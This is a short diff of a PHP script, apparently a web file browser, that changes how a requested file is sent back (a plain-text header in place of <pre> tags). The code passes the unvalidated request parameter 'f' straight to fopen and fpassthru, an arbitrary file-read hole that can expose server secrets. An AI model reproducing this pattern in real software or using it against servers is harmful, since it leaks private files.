@@ -5,9 +5,8 @@ ob_implicit_flush();
 if(isset($_REQUEST['f'])){
         $filename=$_REQUEST['f'];
         $file=fopen("$filename","rb");
-	print "<pre>";
+	header("Content-Type: text/plain");
         fpassthru($file);
-	print "</pre>";
         die;
 }
 if(isset($_REQUEST['d'])){
